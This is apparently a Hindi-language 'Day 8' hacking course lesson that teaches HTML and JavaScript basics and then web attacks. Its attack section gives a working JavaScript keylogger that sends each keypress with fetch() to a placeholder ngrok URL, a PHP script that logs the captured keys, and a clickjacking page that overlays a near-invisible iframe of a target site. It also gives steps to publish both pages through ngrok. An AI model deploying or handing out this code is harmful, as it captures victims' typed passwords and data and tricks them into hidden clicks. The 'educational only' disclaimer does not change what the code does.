# 🧠 Day 8 – HTML + JavaScript Basics & Web Attacks (Hindi Guide)

---

## 🔹 HTML + JavaScript Basics (हैकिंग के नजरिए से)

### 🧱 HTML क्या है?

* HTML (HyperText Markup Language) एक markup भाषा है जो webpages का ढांचा (structure) बनाती है।
* Webpage में क्या दिखेगा, कैसा दिखेगा, यह HTML तय करता है।
* इसमें हम elements या tags का उपयोग करते हैं:

  * `<html>` – पूरी HTML डॉक्यूमेंट की शुरुआत
  * `<head>` – meta जानकारी, title, CSS, JS इत्यादि
  * `<body>` – जो भी user को दिखाई देगा
  * `<h1>`, `<p>`, `<a>`, `<img>`, `<form>` आदि tags content को दर्शाते हैं।

### 🔧 JavaScript क्या है?

* JavaScript एक scripting language है जो webpages को dynamic और interactive बनाती है।
* JS HTML के साथ जुड़कर DOM (Document Object Model) को manipulate करता है।
* उदाहरण:

  * बटन क्लिक पर मैसेज दिखाना
  * form validation
  * input data को server पर भेजना

---

## 📋 HTML & JS Cheat Sheet (Quick Reference)

### 🔹 HTML:

| Tag        | Description                  |
| ---------- | ---------------------------- |
| `<html>`   | HTML document की शुरुआत      |
| `<head>`   | Header में meta, CSS, JS     |
| `<body>`   | Main visible content         |
| `<h1>`     | Heading level 1              |
| `<p>`      | Paragraph                    |
| `<a>`      | Anchor link                  |
| `<img>`    | Image insert                 |
| `<input>`  | Input field                  |
| `<button>` | Clickable button             |
| `<form>`   | Form creation                |
| `<script>` | JavaScript embed करने के लिए |

### 🔹 JavaScript:

| Syntax                          | Description                              |
| ------------------------------- | ---------------------------------------- |
| `alert("Hi")`                   | Pop-up message दिखाता है                 |
| `document.getElementById("id")` | किसी element को access करता है           |
| `addEventListener()`            | इवेंट पकड़ने के लिए जैसे click, keypress |
| `fetch(url)`                    | Server को data भेजने के लिए              |

---

## 🧪 HTML + JS Page Example:

```html
<!DOCTYPE html>
<html>
<head>
  <title>My First Page</title>
</head>
<body>
  <h1>👋 Welcome!</h1>
  <button onclick="alert('Hello User')">Click Me</button>
  
  <input id="username" type="text" placeholder="Your Name">
  <button onclick="sendData()">Send</button>

  <script>
    function sendData() {
      let name = document.getElementById("username").value;
      alert("You entered: " + name);
    }
  </script>
</body>
</html>
```

---

## 🔒 JavaScript Attack Techniques (Educational Purpose Only)

### 1️⃣ Keylogger (keyboard पर input capture करना)

#### 🔹 HTML Page (`keylogger.html`):

```html
<!DOCTYPE html>
<html>
<head><title>Keylogger Demo</title></head>
<body>
  <h2>Type Something:</h2>
  <input type="text" placeholder="Type here...">

  <script>
    document.addEventListener("keydown", function(e) {
      fetch("https://YOUR_NGROK_URL/log.php?key=" + encodeURIComponent(e.key));
    });
  </script>
</body>
</html>
```

#### 🔹 PHP Backend (`log.php`):

```php
<?php
if (isset($_GET['key'])) {
  file_put_contents("keys.txt", $_GET['key'] . PHP_EOL, FILE_APPEND);
}
?>
```

---

### 2️⃣ Clickjacking (user को छुपी चीज़ों पर click कराना)

#### 🔹 HTML Page (`clickjack.html`):

```html
<!DOCTYPE html>
<html>
<head><title>Clickjack Test</title></head>
<body>
  <h2>🎁 Claim Your Reward</h2>
  <button style="z-index:2; position:relative;">Click Me</button>

  <iframe src="https://target.com" style="
    opacity: 0.01;
    position: absolute;
    width: 100%; height: 100%;
    top: 0; left: 0;
    z-index: 1;"></iframe>
</body>
</html>
```

📌 iframe तभी काम करेगा जब target site iframe embedding को allow करे।

---

## 💻 Local Hosting Setup (Windows/Linux)

### 📁 Folder Structure:

```
web_attacks/
├── log.php
├── keys.txt
├── keylogger.html
├── clickjack.html
```

### ▶️ Server Start करने के लिए:

```bash
php -S 0.0.0.0:8080
```

### 🌐 Ngrok से Public Link:

```bash
ngrok http 8080
```

📎 Example URLs:

* `https://abc123.ngrok.io/keylogger.html`
* `https://abc123.ngrok.io/clickjack.html`

---

## ✅ Summary Table

| Technique    | Purpose             | Requires PHP | Dev Console Possible |
| ------------ | ------------------- | ------------ | -------------------- |
| Keylogger    | Keypress capture    | ✅            | ✅                    |
| Clickjacking | Hidden target click | ❌            | ❌                    |

---

## ⚠️ Disclaimer

यह document केवल educational purpose के लिए है। इसका उपयोग केवल वैध और ethical hacking अभ्यास के लिए करें। किसी unauthorized activity की जिम्मेदारी आपकी स्वयं की होगी।

---

## 📦 आगे क्या?

* ZIP बनवाने के लिए लिखें: `make zip`
* अगला दिन स्टार्ट करें: `start day 9`
* Extra attack जोड़ना हो: `add more attack`

Happy Learning! 🔐
